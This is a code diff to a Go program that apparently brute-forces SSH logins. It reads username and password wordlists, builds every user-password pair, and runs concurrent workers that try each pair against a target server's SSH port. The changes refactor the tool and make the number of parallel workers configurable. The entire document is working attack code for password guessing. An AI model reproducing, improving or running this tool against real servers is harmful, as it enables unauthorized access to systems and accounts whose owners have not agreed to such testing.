@@ -15,6 +15,12 @@ import (
     "golang.org/x/crypto/ssh"
 )
 
+type readerChan struct{
+    user string
+    pass string
+    pos string
+}
+
 var wg sync.WaitGroup
 
 func check(e error) {
@@ -56,9 +62,7 @@ func ssh_test(username, password, serverIP, serverPort string) {
 func work (job readerChan, serverIP, serverPort string){
     defer wg.Done()
     log.Println("[Attemp]", job.user, job.pass, job.pos)
-    // time.Sleep(3 * time.Second)//proccess
     ssh_test(job.user, job.pass, serverIP, serverPort)
-    // log.Println("[x]", job.user, job.pass, job.pos)
 }
 
 func read_files(user_file, pass_file string, rchan chan readerChan){
@@ -90,9 +94,7 @@ func read_files(user_file, pass_file string, rchan chan readerChan){
                 check(err)
             }
         } else {
-            // for j,u := range userList{
             for j,u := range userList{
-                // fmt.Println("[+]",j,i,u,preader.Text())
                 rchan <- readerChan {user: u, pass: preader.Text(), pos: strconv.Itoa(i)+"-"+strconv.Itoa(j)}
             }
         }
@@ -103,21 +105,18 @@ func read_files(user_file, pass_file string, rchan chan readerChan){
 
 }
 
-type readerChan struct{
-    user string
-    pass string
-    pos string
-}
-
-func ssh_bruteforce_start(userFile, passFile string, serverIP, serverPort string){
+func Ssh_bruteforce_start(userFile, passFile string, serverIP, serverPort string, n_workers int){
     // runtime.GOMAXPROCS(4)
-    goMax := 9
+    if n_workers == 0{
+        n_workers = 9
+    }
     log.Println("[0] Starting jobs")
-
-    rchan := make(chan readerChan, goMax)
+    log.Println(userFile, passFile, serverIP, serverPort, n_workers)
+    
+    rchan := make(chan readerChan, n_workers)
     go read_files(userFile, passFile, rchan)
-    var sem = make(chan int, goMax)
-    for i:= 0; i< goMax; i++{
+    var sem = make(chan int, n_workers)
+    for i:= 0; i< n_workers; i++{
         sem <- 1
     }
     for {
@@ -130,9 +129,11 @@ func ssh_bruteforce_start(userFile, passFile string, serverIP, serverPort string
             }
             wg.Add(1)
             <-sem
+            // sem <- 1
             go func(job readerChan){
                 work(job, serverIP, serverPort)
                 sem <- 1
+                // <-sem
             }(job)
         }
     }
